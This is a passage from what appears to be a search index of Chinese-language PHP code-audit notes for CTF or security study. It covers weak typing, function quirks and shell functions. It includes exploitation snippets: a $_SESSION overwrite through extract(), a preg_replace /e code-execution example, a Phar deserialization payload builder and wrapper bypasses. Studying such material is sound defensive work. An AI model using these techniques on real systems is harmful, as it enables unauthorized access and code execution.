\u6307\u5b9a\u6570\u5b57\u6253\u5370\u7cbe\u5ea6\uff1b\u5982\u679c\u662f\u5b57\u7b26\u4e32\uff0c\u8bbe\u7f6e\u6700\u5927\u6253\u5370\u957f\u5ea6 \u6253\u5370\u7c7b\u578b % \u8f6c\u4e49\u7684% b \u5c06\u6574\u6570\u6253\u5370\u4e3a\u4e8c\u8fdb\u5236 c \u5c06\u6574\u6570\u6253\u5370\u6210ASCII\u5bf9\u5e94\u7684\u5b57\u7b26 d \u5c06\u6574\u6570\u6253\u5370\u6210\u6709\u7b26\u53f7\u5341\u8fdb\u5236\u6570 e \u5c06\u6570\u5b57\u6253\u5370\u79d1\u5b66\u8ba1\u6570\u6cd5(1.2e+2) E \u540c\u4e0a(1.2E+2) f \u5c06\u6d6e\u70b9\u6570\u6253\u5370\u4e3a\u6d6e\u70b9\u6570 g %e \u7684\u7b80\u77ed\u7248\u672c G %E \u7684\u7b80\u77ed\u7248\u672c o \u5c06\u6574\u6570\u6253\u5370\u4e3a\u516b\u8fdb\u5236 u \u5c06\u6574\u6570\u6253\u5370\u4e3a\u65e0\u7b26\u53f7\u5341\u8fdb\u5236\u6574\u6570 x \u5c06\u6574\u6570\u6253\u5370\u4e3a\u5341\u516d\u8fdb\u5236\u6570\uff08\u5c0f\u5199\uff09 X \u5c06\u6574\u6570\u6253\u5370\u4e3a\u5341\u516d\u8fdb\u5236\u6570\uff08\u5927\u5199\uff09 \u53ef\u80fd\u5229\u7528\u7684\u7279\u6027\uff1a \u5982\u679c\u5b58\u5728\u4e0a\u8ff0\u683c\u5f0f\u5316\u5b57\u7b26\u4e2d\u4e0d\u5b58\u5728\u7684\u5b57\u7b26\u5219\u5ffd\u7565\u4e0d\u5904\u7406 addslashes \u8fc7\u6ee4\u7684\u5b57\u7b26\uff1a NULL (0x0) \" (0x22) ' (0x27) \\ (0x5c) file_put_contents int file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] ) \u53ef\u4ee5\u5199\u5165\u6570\u7ec4\uff0c\u7ed5\u8fc7\u5b57\u7b26\u4e32\u8fc7\u6ee4\u7684\u9650\u5236 spl_autoload_register \u4e0d\u6307\u5b9a\u53c2\u6570\u4f1a\u81ea\u52a8\u8f7d\u5165\u76ee\u5f55\u4e0b .inc \u548c .php \u4e2d\u7684class create_function string create_function ( string $args , string $code ) demo: $fun = create_function( $a , return $a + 1; ); $fun(1); PHP shell\u76f8\u5173 exec string exec ( string $command [, array $output [, int $return_var ]] ) \u6267\u884c $command \uff0c\u8fd4\u56de\u6267\u884c\u7ed3\u679c\u7684\u6700\u540e\u4e00\u884c\u3002\u628a\u5168\u90e8\u7ed3\u679c\u4f5c\u4e3a\u6570\u7ec4\u5b58\u5728 $output \uff0c\u628a\u8fd4\u56de\u503c\u5b58\u5230 $return_val \u4e2d\u3002 paththru void passthru ( string $command [, int $return_var ] ) \u6267\u884c $command \uff0c \u6253\u5370\u539f\u59cb\u7ed3\u679c system string system ( string $command [, int $return_var ] ) \u6267\u884c $command \uff0c \u6253\u5370\u7ed3\u679c \u6210\u529f\u5219\u8fd4\u56de\u547d\u4ee4\u8f93\u51fa\u7684\u6700\u540e\u4e00\u884c\uff0c\u5931\u8d25\u5219\u8fd4\u56de FALSE shell_exec string shell_exec ( string $cmd ) \u6267\u884c $cmd \u8fd4\u56de\u8f93\u51fa\u5b57\u7b26\u4e32 $rt_val = `ls -a`; //\u6548\u679c\u76f8\u540c escapeshellarg string escapeshellarg ( string $arg ) \u628a $arg \u5b89\u6392\u4e0a\u5355\u5f15\u53f7 escapeshellcmd string escapeshellcmd ( string $command ) \u8f6c\u4e49\u4e0b\u5217\u5b57\u7b26\uff1a \\n 0xa # 0x23 $ 0x24 0x26 ( 0x28 ) 0x29 * 0x2a ; 0x3b 0x3c 0x3e ? 0x3f [ 0x5b \\ 0x5c ] 0x5d ^ 0x5e ` 0x60 { 0x7b | 0x7c } 0x7d ~ 0x7e \u5982\u679c \" \uff0c ' \u4e0d\u6210\u5bf9\uff0c\u4e5f\u4f1a\u5bf9\u5176\u8f6c\u4e49","title":"\u4ee3\u7801\u5ba1\u8ba1"},{"location":"web/php/audit/#php","text":"php\u662f\u6700\u597d\u7684\u8bed\u8a00\uff01","title":"PHP\u76f8\u5173"},{"location":"web/php/audit/#php_1","text":"var_dump('0xABCdef' == ' 0xABCdef'); true (Output for hhvm-3.18.5 - 3.22.0, 7.0.0 - 7.2.0rc4: false) var_dump('0010e2' == '1e3\u2019); true strcmp([],[]) 0 sha1([]) NULL '123' == 123 'abc' == 0 '0x01' == 1 PHP 7.0\u540e\uff0c16\u4f4d\u5b57\u7b26\u4e32\u4e0d\u5728\u5f53\u6210\u6570\u5b57\uff08 '0x01 != 1' \uff09 0 == '' == false == NULL $a = 'a' ++$a = 'b' $a+1 = 1","title":"PHP\u5f31\u7c7b\u578b"},{"location":"web/php/audit/#php_2","text":"$_GET \u4f1a\u5bf9\u4f20\u5165\u7684\u6570\u636e\u8fdb\u884cURLdecode $_SERVER['REQUEST_URI'] \u548c $_SERVER['QUERY_STRING'] \u5219\u662f\u76f4\u63a5\u8fd4\u56de","title":"PHP \u5168\u5c40\u53d8\u91cf"},{"location":"web/php/audit/#php_3","text":"","title":"PHP\u51fd\u6570\u7279\u6027"},{"location":"web/php/audit/#intval","text":"\u56db\u820d\u4e94\u5165(\u4e0d\u5b58\u5728\u7684\u622a\u65ad) var_dump(intval('5278.78')) = 5278 intval(012) = 10 intval(\"012\") = 12","title":"intval"},{"location":"web/php/audit/#extract","text":"int extract ( array $array [, int $flags = EXTR_OVERWRITE [, string $prefix = NULL ]] ) \u63d0\u53d6\u51fa\u6570\u7ec4\u4e2d\u7684\u952e\u503c\uff0c\u8986\u76d6\u8fdb\u53d8\u91cf .php?_SESSION[name]=admin \u5c06admin\u8986\u76d6\u5165session","title":"extract"},{"location":"web/php/audit/#trim","text":"string trim ( string $str [, string $character_mask = \\t\\n\\r\\0\\x0B ] ) \u53bb\u6389\u5b57\u7b26\u4e32\u524d\u540e\u7a7a\u767d\u5b57\u7b26 \u9ed8\u8ba4\u53bb\u6389\u4ee5\u4e0b\u5b57\u7b26 \" \" (0x20) \"\\t\" (0x09) \"\\n\" (0x0A) \"\\x0B\" (0x0B) \"\\r\" (0x0D) \"\\0\" (0x00) \u53ef\u4ee5\u9ed8\u8ba4\u4e0d\u5305\u542b \"\\f\" (0x0C) \u6bd4\u8f83\uff1ais_numeric()\u5141\u8bb8 \\f \u5728\u5f00\u5934","title":"trim"},{"location":"web/php/audit/#in_array","text":"bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) \u9ed8\u8ba4\u4f7f\u7528\u677e\u6563\u6bd4\u8f83 \u5224\u65ad\u503c\u662f\u5426\u5728\u6570\u7ec4\u4e2d\u800c\u4e0d\u662f\u952e\u662f\u5426\u5728\u6570\u7ec4\u4e2d","title":"in_array"},{"location":"web/php/audit/#array_search","text":"mixed array_search(mixed $needle , array $haystack [, bool $strict = false ]) \u4e0ein_array\u7c7b\u4f3c\uff0c\u6210\u529f\u8fd4\u56deindex\uff0c\u5931\u8d25\u8fd4\u56deFALSE","title":"array_search"},{"location":"web/php/audit/#parse_str","text":"void parse_str ( string $encoded_string [, array $result ] ) \u53d8\u91cf\u8986\u76d6\uff0c\u4e0eextract\u7c7b\u4f3c\uff0c\u4f20\u5165\u7684\u662furlencode\u8fc7\u7684\u5b57\u7b26\u4e32\uff0c\u4f20\u5165\u6307\u5b9a\u6570\u7ec4\uff0c\u6307\u5b9a\u6570\u7ec4\u672a\u8bbe\u7f6e\uff0c\u4f1a\u8986\u76d6\u5168\u5c40\u53d8\u91cf \u53d8\u91cf\u540d\u4e2d\u6709 \uff08\u7a7a\u683c\uff09\u6216 . \uff08\u70b9\uff09\uff0c\u4f1a\u88ab\u66ff\u6362\u6210 _ \uff08\u4e0b\u5212\u7ebf\uff09","title":"parse_str"},{"location":"web/php/audit/#parse_url","text":"\u5728\u5904\u7406URL\u65f6\u4f1a\u6709\u95ee\u9898 parse_url('/a.php?id=1') array(2) { [ host ]= string(5) a.php [ query ]= string(4) id=1 } - parse_url('//a/b') host: a parse_url('..//a/b/c:80') host: .. port: 80 path: //a/b/c:80 parse_url('///a.php?id=1') false parse_url('/a.php?id=1:80') PHP 7.0.0 false PHP = 7.0.0 array(2) { [ path ]= string(6) /a.php [ query ]= string(7) id=1:80 } parse_url('http://kaibro.tw:87878') 5.3.X\u7248\u672c\u4ee5\u4e0b array(3) { [ scheme ]= string(4) http [ host ]= string(9) kaibro.tw [ port ]= int(22342) } \u5176\u4ed6\uff1a false","title":"parse_url"},{"location":"web/php/audit/#preg_replace","text":"mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int $count ]] ) \u641c\u5bfb $subject \u4e2d\u5339\u914d\u7684 $pattern \uff0c\u5e76\u7528 $replacement \u66ff\u6362 \u7b2c\u4e00\u4e2a\u53c2\u6570\u7528 /e \u4fee\u9970\u7b26\uff0c $replacement \u4f1a\u88ab\u5f53\u6210PHP code\u6267\u884c \u5fc5\u987b\u6709\u5339\u914d\u5230\u624d\u4f1a\u6267\u884c PHP 5.5.0\u8d77\uff0c\u6703\u7522\u751f E_DEPRECATED \u9519\u8bef PHP 7.0.0\u4e0d\u518d\u652f\u63f4\uff0c\u7528 preg_replace_callback() \u4ee3\u66ff example: ?php $a = phpkaibro ; echo preg_replace ( /(.*)kaibro/e , \\\\1info() , $a );","title":"preg_replace"},{"location":"web/php/audit/#sprintfvprintf","text":"\u6253\u5370\u683c\u5f0f\uff1a % \u6807\u5fd7\u8fd9\u4e00\u4e2a\u683c\u5f0f\u5316\u4f4d\u7f6e\u7684\u8d77\u70b9 [num]$ \u9009\u62e9\u7b2c [num] \u4e2a\u53c2\u6570 + \u6216 - \u5f3a\u5236\u663e\u793a\u7b26\u53f7\uff08\u9ed8\u8ba4\u663e\u793a\u8d1f\u53f7\uff0c\u5ffd\u7565\u6b63\u53f7\uff09(\u53ef\u9009) 0 \u6216 '[char] \u4ee50\u6216\u8005 [char] \u4f5c\u4e3a\u586b\u5145\u5b57\u7b26\uff0c\u9ed8\u8ba4\u4e3a\u7a7a\u683c\uff08\u53ef\u9009\uff09 \u6570\u5b57\uff0c\u89c4\u5b9a\u6253\u5370\u5bbd\u5ea6\uff08\u53ef\u9009\uff09 .[num] \u6307\u5b9a\u6570\u5b57\u6253\u5370\u7cbe\u5ea6\uff1b\u5982\u679c\u662f\u5b57\u7b26\u4e32\uff0c\u8bbe\u7f6e\u6700\u5927\u6253\u5370\u957f\u5ea6 \u6253\u5370\u7c7b\u578b % \u8f6c\u4e49\u7684% b \u5c06\u6574\u6570\u6253\u5370\u4e3a\u4e8c\u8fdb\u5236 c \u5c06\u6574\u6570\u6253\u5370\u6210ASCII\u5bf9\u5e94\u7684\u5b57\u7b26 d \u5c06\u6574\u6570\u6253\u5370\u6210\u6709\u7b26\u53f7\u5341\u8fdb\u5236\u6570 e \u5c06\u6570\u5b57\u6253\u5370\u79d1\u5b66\u8ba1\u6570\u6cd5(1.2e+2) E \u540c\u4e0a(1.2E+2) f \u5c06\u6d6e\u70b9\u6570\u6253\u5370\u4e3a\u6d6e\u70b9\u6570 g %e \u7684\u7b80\u77ed\u7248\u672c G %E \u7684\u7b80\u77ed\u7248\u672c o \u5c06\u6574\u6570\u6253\u5370\u4e3a\u516b\u8fdb\u5236 u \u5c06\u6574\u6570\u6253\u5370\u4e3a\u65e0\u7b26\u53f7\u5341\u8fdb\u5236\u6574\u6570 x \u5c06\u6574\u6570\u6253\u5370\u4e3a\u5341\u516d\u8fdb\u5236\u6570\uff08\u5c0f\u5199\uff09 X \u5c06\u6574\u6570\u6253\u5370\u4e3a\u5341\u516d\u8fdb\u5236\u6570\uff08\u5927\u5199\uff09 \u53ef\u80fd\u5229\u7528\u7684\u7279\u6027\uff1a \u5982\u679c\u5b58\u5728\u4e0a\u8ff0\u683c\u5f0f\u5316\u5b57\u7b26\u4e2d\u4e0d\u5b58\u5728\u7684\u5b57\u7b26\u5219\u5ffd\u7565\u4e0d\u5904\u7406","title":"sprintf/vprintf"},{"location":"web/php/audit/#addslashes","text":"\u8fc7\u6ee4\u7684\u5b57\u7b26\uff1a NULL (0x0) \" (0x22) ' (0x27) \\ (0x5c)","title":"addslashes"},{"location":"web/php/audit/#file_put_contents","text":"int file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] ) \u53ef\u4ee5\u5199\u5165\u6570\u7ec4\uff0c\u7ed5\u8fc7\u5b57\u7b26\u4e32\u8fc7\u6ee4\u7684\u9650\u5236","title":"file_put_contents"},{"location":"web/php/audit/#spl_autoload_register","text":"\u4e0d\u6307\u5b9a\u53c2\u6570\u4f1a\u81ea\u52a8\u8f7d\u5165\u76ee\u5f55\u4e0b .inc \u548c .php \u4e2d\u7684class","title":"spl_autoload_register"},{"location":"web/php/audit/#create_function","text":"string create_function ( string $args , string $code ) demo: $fun = create_function( $a , return $a + 1; ); $fun(1);","title":"create_function"},{"location":"web/php/audit/#php-shell","text":"","title":"PHP shell\u76f8\u5173"},{"location":"web/php/audit/#exec","text":"string exec ( string $command [, array $output [, int $return_var ]] ) \u6267\u884c $command \uff0c\u8fd4\u56de\u6267\u884c\u7ed3\u679c\u7684\u6700\u540e\u4e00\u884c\u3002\u628a\u5168\u90e8\u7ed3\u679c\u4f5c\u4e3a\u6570\u7ec4\u5b58\u5728 $output \uff0c\u628a\u8fd4\u56de\u503c\u5b58\u5230 $return_val \u4e2d\u3002","title":"exec"},{"location":"web/php/audit/#paththru","text":"void passthru ( string $command [, int $return_var ] ) \u6267\u884c $command \uff0c \u6253\u5370\u539f\u59cb\u7ed3\u679c","title":"paththru"},{"location":"web/php/audit/#system","text":"string system ( string $command [, int $return_var ] ) \u6267\u884c $command \uff0c \u6253\u5370\u7ed3\u679c \u6210\u529f\u5219\u8fd4\u56de\u547d\u4ee4\u8f93\u51fa\u7684\u6700\u540e\u4e00\u884c\uff0c\u5931\u8d25\u5219\u8fd4\u56de FALSE","title":"system"},{"location":"web/php/audit/#shell_exec","text":"string shell_exec ( string $cmd ) \u6267\u884c $cmd \u8fd4\u56de\u8f93\u51fa\u5b57\u7b26\u4e32 $rt_val = `ls -a`; //\u6548\u679c\u76f8\u540c","title":"shell_exec"},{"location":"web/php/audit/#escapeshellarg","text":"string escapeshellarg ( string $arg ) \u628a $arg \u5b89\u6392\u4e0a\u5355\u5f15\u53f7","title":"escapeshellarg"},{"location":"web/php/audit/#escapeshellcmd","text":"string escapeshellcmd ( string $command ) \u8f6c\u4e49\u4e0b\u5217\u5b57\u7b26\uff1a \\n 0xa # 0x23 $ 0x24 0x26 ( 0x28 ) 0x29 * 0x2a ; 0x3b 0x3c 0x3e ? 0x3f [ 0x5b \\ 0x5c ] 0x5d ^ 0x5e ` 0x60 { 0x7b | 0x7c } 0x7d ~ 0x7e \u5982\u679c \" \uff0c ' \u4e0d\u6210\u5bf9\uff0c\u4e5f\u4f1a\u5bf9\u5176\u8f6c\u4e49","title":"escapeshellcmd"},{"location":"web/php/serialize/","text":"PHP Object Injection Phar \u76f8\u5173\u539f\u7406\uff1a https://paper.seebug.org/680/ https://blog.zsxsoft.com/post/38?from=timeline isappinstalled=0 Phar\u6784\u9020 ?php include __DIR__ . /vender/autoload.php ; @ unlink ( phar.phar ); $phar = new Phar ( phar.phar ); //\u540e\u7f00\u540d\u5fc5\u987b\u4e3aphar $phar - startBuffering (); $phar - setStub ( ?php __HALT_COMPILER(); ? ); //\u8bbe\u7f6estub $o = new TestObject (); # \u5e26\u6709\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u7c7b $phar - setMetadata ( $o ); //\u5c06\u81ea\u5b9a\u4e49\u7684meta-data\u5b58\u5165manifest $phar - addFromString ( test.txt , test ); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6 //\u7b7e\u540d\u81ea\u52a8\u8ba1\u7b97 $phar - stopBuffering (); \u76f8\u5173\u5229\u7528 \u53d7\u5f71\u54cd\u51fd\u6570\uff1a phar://test.phar/test.txt phar\u6587\u4ef6\u7684\u540e\u7f00\u4e0d\u4e00\u5b9a\u662fphar \u7ed5\u8fc7\u59ff\u52bf\uff1a Phar://test.phar/test.txt compress.bzip2://phar://test.phar/test.txt compress.zlib://phar://test.phar/test.txt \u6570\u636e\u5e93\u76f8\u5173\uff1a Mysql LOAD DATA LOCAL INFILE Postgre $pdo- pgsqlCopyFromFile \u53c2\u8003\u8d44\u6599 https://www.insomniasec.com/downloads/publications/Practical%20PHP%20Object%20Injection.pdf https://github.com/ambionics/phpggc","title":"\u53cd\u5e8f\u5217\u5316\u76f8\u5173"},{"location":"web/php/serialize/#php-object-injection","text":"","title":"PHP Object Injection"},{"location":"web/php/serialize/#phar","text":"","title":"Phar"},{"location":"web/php/serialize/#_1","text":"https://paper.seebug.org/680/ https://blog.zsxsoft.com/post/38?from=timeline isappinstalled=0","title":"\u76f8\u5173\u539f\u7406\uff1a"},{"location":"web/php/serialize/#phar_1","text":"?php include __DIR__ . /vender/autoload.php ; @ unlink ( phar.phar ); $phar = new Phar ( phar.phar ); //\u540e\u7f00\u540d\u5fc5\u987b\u4e3aphar $phar - startBuffering (); $phar - setStub ( ?php __HALT_COMPILER(); ? ); //\u8bbe\u7f6estub $o = new TestObject (); # \u5e26\u6709\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u7c7b $phar - setMetadata ( $o ); //\u5c06\u81ea\u5b9a\u4e49\u7684meta-data\u5b58\u5165manifest $phar - addFromString ( test.txt , test ); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6 //\u7b7e\u540d\u81ea\u52a8\u8ba1\u7b97 $phar - stopBuffering ();","title":"Phar\u6784\u9020"},{"location":"web/php/serialize/#_2","text":"\u53d7\u5f71\u54cd\u51fd\u6570\uff1a phar://test.phar/test.txt phar\u6587\u4ef6\u7684\u540e\u7f00\u4e0d\u4e00\u5b9a\u662fphar \u7ed5\u8fc7\u59ff\u52bf\uff1a Phar://test.phar/test.txt compress.bzip2://phar://test.phar/test.txt compress.zlib://phar://test.phar/test.txt \u6570\u636e\u5e93\u76f8\u5173\uff1a Mysql LOAD DATA LOCAL INFILE Postgre $pdo- pgsqlCopyFromFile","title":"\u76f8\u5173\u5229\u7528"},{"location":"web/php/serialize/#_3","text":"https://www.insomniasec.com/downloads/publications/Practical%20PHP%20Object%20Injection.pdf https://github.com/ambionics/phpggc","title":"\u53c2\u8003\u8d44\u6599"}]}